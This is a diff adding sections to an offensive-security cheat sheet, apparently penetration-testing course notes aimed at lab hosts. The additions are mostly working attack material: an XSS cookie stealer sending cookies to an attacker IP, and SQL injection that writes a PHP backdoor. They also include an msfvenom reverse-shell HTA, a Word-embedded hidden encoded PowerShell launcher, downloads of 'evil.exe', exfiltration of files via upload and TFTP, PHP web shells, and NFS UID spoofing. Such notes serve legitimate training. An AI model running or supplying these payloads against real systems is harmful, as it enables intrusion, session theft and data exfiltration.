@@ -56,8 +56,6 @@ for ip in $(cat list.txt); do host $ip.megacorpone.com; done
 
 ```bash
 for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
-
-for i in {1..10}; do echo 10.11.1.$i;done
 ```
 
 Windows **nslookup**
@@ -185,6 +183,37 @@ crackmapexec smb 192.168.50.242 -u john -d beyond.com -p "dqsTwTpZPn#nL" --share
 
 SMB signing set to False => we can potentially perform relay attacks if we can force an authentication request (impacket-ntlmrelayx)
 
+## NFS Enumeration
+
+Network File System (NFS) is a distributed file system protocol. It allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage.
+
+Both Portmapper and RPCbind run on TCP port 111. RPCbind maps RPC services to the ports on which they listen. RPC processes notify rpcbind when they start, registering the ports they are listening on and the RPC **program numbers** they expect to serve.
+
+The client system then contacts rpcbind on the server with a particular RPC program number. The rpcbind service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service.
+
+Use NSE scripts like rpcinfo to find services that may have registered with rpcbind
+
+```bash
+nmap -v -p 111 10.11.1.1-254
+nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
+```
+
+```bash
+nmap -p 111 --script nfs* 10.11.1.72
+```
+
+```bash
+sudo mount -o nolock 10.11.1.72:/home ~/home/
+```
+
+Add a local user, change its UUID to e.g., 1014, su to that user, and then try accessing the file again
+
+```bash
+sudo adduser pwn
+sudo sed -i -e 's/1001/1014/g' /etc/passwd
+su pwn
+```
+
 ## SMTP Enumeration
 
 ```pwsh
@@ -300,7 +329,7 @@ snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
 # Vulnerability Scanning with Nmap
 
 ```bash
-cat /usr/share/nmap/scripts/script.db | grep "\"vuln\""
+cat /usr/share/nmap/scripts/script.db | grep '"vuln"\|"exploit"'
 ```
 
 ```bash
@@ -321,13 +350,21 @@ whatweb http://192.168.50.244
 ```
 
 ```bash
-wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
-```
-
-```bash
 gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
 
 gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config 
+```
+
+```bash
+dirb http://www.megacorpone.com -r -z 10
+```
+
+```bash
+nikto -host=http://www.megacorpone.com -maxtime=30s
+```
+
+```bash
+wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
 ```
 
 ## Enumerating and Abusing APIs
@@ -347,6 +384,37 @@ curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Ty
 ```
 
 ## XSS
+
+```html
+<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
+```
+
+Cookie stealer
+```html
+<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
+```
+
+Simulate an admin user login: `powershell -ExecutionPolicy Bypass -File admin_login.ps1`
+
+`admin_login.ps1`
+```pwsh
+$username="admin"
+$password="p@ssw0rd"
+$url_login="127.0.0.1/login.php"
+
+$ie = New-Object -com InternetExplorer.Application
+$ie.Visible = $true
+$ie.navigate("$url_login")
+while($ie.ReadyState -ne 4){ start-sleep -m 1000}
+$ie.document.getElementsByName("username")[0].value="$username"
+$ie.document.getElementsByName("password")[0].value="$password"
+start-sleep -m 10
+$ie.document.getElementsByClassName("btn")[0].click()
+start-sleep -m 100
+$ie.Quit()
+[System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)
+```
+
 **User-Agent** HTTP header: `<script>alert(42)</script>`
 
 **AJAX**
@@ -396,6 +464,8 @@ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<encoded 
 File that is readable by all local users:
 - On Linux: `/etc/passwd`
 - On Windows: `C:\Windows\System32\drivers\etc\hosts`
+
+`http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts`
 
 IIS web server => log paths and web root structure.
 * `C:\inetpub\logs\LogFiles\W3SVC1\`.
@@ -525,6 +595,10 @@ Enter in the *Username* field
 offsec' OR 1=1 -- //
 ```
 
+```
+tom' or 1=1 LIMIT 1;#
+```
+
 ### Error-based payloads
 
 ```
@@ -549,6 +623,14 @@ Orders the results by a specific column => number of columns
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
 ```
 
+```
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
+
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+```
+
 ### Blind SQL Injections
 
 `http://192.168.50.16/blindsqli.php?user=`
@@ -565,7 +647,7 @@ offsec' AND IF (1=1, sleep(3),'false') -- //
 ### sqlmap
 
 ```bash
-sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
 
 sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 
@@ -729,6 +811,41 @@ John
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
+## HTML Application
+
+```html
+<html>
+<head>
+<script>
+  var c= 'cmd.exe'
+  new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+<body>
+<script>
+  self.close();
+</script>
+</body>
+</html>
+```
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
+```
+
+## Object Linking and Embedding
+
+`launch.bat`
+```
+START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
+```
+
+Include the above script in a Microsoft Word document.
+
+Open Microsoft Word, create a new document, navigate to the Insert ribbon, and click the Object menu. Choose the Create from File tab and select our newly-created batch script, `launch.bat`. Check the Display as icon check box and choose Change Icon. Even though this is an embedded batch file, Microsoft allows us to pick a different icon for it and enter a caption, which is what the victim will see, rather than the actual file name.
+
+Like Microsoft Word, Microsoft Publisher allows embedded objects and ultimately code execution in exactly the same manner, but will not enable **Protected View** for Internet-delivered documents.
+
 # Public Exploits
 
 The **Browser Exploitation Framework (BeEF)** tool focuses on client-side attacks executed within a web browser.
@@ -746,6 +863,12 @@ searchsploit -m 42031
 ```bash
 grep Exploits /usr/share/nmap/scripts/*.nse
 nmap --script-help=clamav-exec.nse
+```
+
+Browse to http://127.0.0.1:3000/ui/panel using the default credentials beef/beef to log in
+
+```bash
+sudo beef-xss
 ```
 
 ## Fixing Exploits
@@ -1205,6 +1328,7 @@ Get-Process
 
 ```bat
 systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 
 ipconfig /all
 
@@ -1219,6 +1343,60 @@ route print
 netstat -ano
 netstat -anp TCP | find "2222"
 ```
+
+```bat
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
+```
+
+List applications that do not use the Windows Installer
+
+```bat
+wmic product get name, version, vendor
+```
+
+list system-wide updates by querying the Win32_QuickFixEngineering (qfe)32 WMI class
+
+```bat
+wmic qfe get Caption, Description, HotFixID, InstalledOn
+```
+
+-u to suppress errors, -w to search for write access permissions, and -s to perform a recursive search
+
+```bat
+accesschk.exe -uws "Everyone" "C:\Program Files"
+```
+
+Search for any object can be modified (Modify) by members of the Everyone group
+
+```pwsh
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+```
+
+```bat
+mountvol
+```
+
+Enumerating Device Drivers and Kernel Modules
+
+```
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+```
+
+Request the version number of each loaded driver
+
+```pwsh
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+```
+
+Enumerating Binaries That AutoElevate (like SUID)
+
+```bat
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+```
+
 
 ## Hidden in Plain View
 
@@ -1279,6 +1457,10 @@ Users or programs creating a service can choose either one of those accounts, a 
 ### Service Binary Hijacking
 
 List of all installed Windows services
+
+```bat
+tasklist /SVC
+```
 
 ```pwsh
 Get-Service
@@ -1584,9 +1766,11 @@ cat /etc/iptables/rules.v4
 ```
 
 List cron jobs running
+System administrators often add their own scheduled tasks in the /etc/crontab file
 
 ```bash
 ls -lah /etc/cron*
+cat /etc/crontab
 crontab -l
 sudo crontab -l
 ```
@@ -3312,7 +3496,18 @@ iwr -Uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
 ```
 
 ```bat
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+```
+
+```bat
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+```
+
+```bat
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 
 ## Socat
@@ -3330,6 +3525,129 @@ sudo nc -lnvp 443 > receiving_powercat.ps1
 
 ```pwsh
 powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+```
+
+## Pure-FTPd
+
+```bash
+sudo apt install pure-ftpd
+
+sudo systemctl restart pure-ftpd
+```
+
+`sudo ./setup-ftp.sh`
+
+```bash
+#!/bin/bash
+
+sudo groupadd ftpgroup
+sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+sudo pure-pw useradd offsec -u ftpuser -d /ftphome
+sudo pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+sudo ln -s ../conf/PureDB 60pdb
+sudo mkdir -p /ftphome
+sudo chown -R ftpuser:ftpgroup /ftphome/
+sudo systemctl restart pure-ftpd
+```
+
+## Non-Interactive FTP Download
+
+`ftp.txt`
+
+```
+echo open 10.11.0.4 21> ftp.txt
+echo USER offsec>> ftp.txt
+echo lab>> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+```
+
+```bat
+ftp -v -n -s:ftp.txt
+```
+
+## Windows Downloads using VBScript
+
+Simple HTTP downloader (in Windows XP, 2003)
+
+```bat
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo  Err.Clear >> wget.vbs
+echo  Set http = Nothing >> wget.vbs
+echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo  http.Open "GET", strURL, False >> wget.vbs
+echo  http.Send >> wget.vbs
+echo  varByteArray = http.ResponseBody >> wget.vbs
+echo  Set http = Nothing >> wget.vbs
+echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo  strData = "" >> wget.vbs
+echo  strBuffer = "" >> wget.vbs
+echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo  Next >> wget.vbs
+echo  ts.Close >> wget.vbs
+```
+
+```bat
+cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+```
+
+## Windows Downloads with exe2hex and PowerShell
+
+```bash
+upx -9 nc.exe
+exe2hex -x nc.exe -p nc.cmd
+```
+
+Copy and paste `nc.cmd` script into a shell on our Windows machine and run it, it will create a perfectly-working copy of our original nc.exe.
+
+## Windows Uploads Using Windows Scripting Languages
+
+`upload.php`
+
+```php
+<?php
+$uploaddir = '/var/www/uploads/';
+
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+```
+
+```bash
+sudo mkdir /var/www/uploads
+ps -ef | grep apache
+sudo chown www-data: /var/www/uploads
+```
+
+```bat
+powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
+```
+
+## Uploading Files with TFTP
+
+```bash
+sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
+sudo atftpd --daemon --port 69 /tftp
+```
+
+```bat
+tftp -i 10.11.0.4 put important.docx
 ```
 
 # Linux Miscellaneous
@@ -3412,6 +3730,62 @@ sudo iptables -Z
 sudo iptables -vn -L
 ```
 
+## Bash Scripting
+
+```bash
+#!/bin/bash
+# elif example
+
+read -p "What is your age: " age
+
+if [ $age -lt 16 ]
+then
+  echo "You might need parental permission to take this course!"
+elif [ $age -gt 60 ]
+then
+  echo "Hats off to you, respect!"
+else
+  echo "Welcome to the course!"
+fi
+```
+
+```bash
+grep $user2 /etc/passwd && echo "$user2 found!" || echo "$user2 not found!"
+```
+
+```bash
+for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
+
+for i in {1..10}; do echo 10.11.1.$i;done
+```
+
+```bash
+#!/bin/bash
+# while loop example
+
+counter=1
+
+while [ $counter -lt 10 ]
+do
+  echo "10.11.1.$counter"
+  ((counter++))
+done
+```
+
+```bash
+#!/bin/bash
+# function return value example
+
+return_me() {
+  echo "Oh hello there, I'm returning a random value!"
+  return $RANDOM
+}
+
+return_me
+
+echo "The previous function returned a value of $?"
+```
+
 # Windows Miscellaneous
 
 ```pwsh
@@ -3444,12 +3818,32 @@ PHP Web Shell
 <?php echo system($_GET['cmd']); ?>
 ```
 
+```php
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+```
+
 ```bash
 git status
 git log
 git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
 ```
 
+Upgrading a Non-Interactive Shell
+
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Start a built-in web server
+
+```bash
+php -S 0.0.0.0:8000
+```
+
+```bash
+ruby -run -e httpd . -p 9000
+```
+
+```bash
+busybox httpd -f -p 10000
 ```
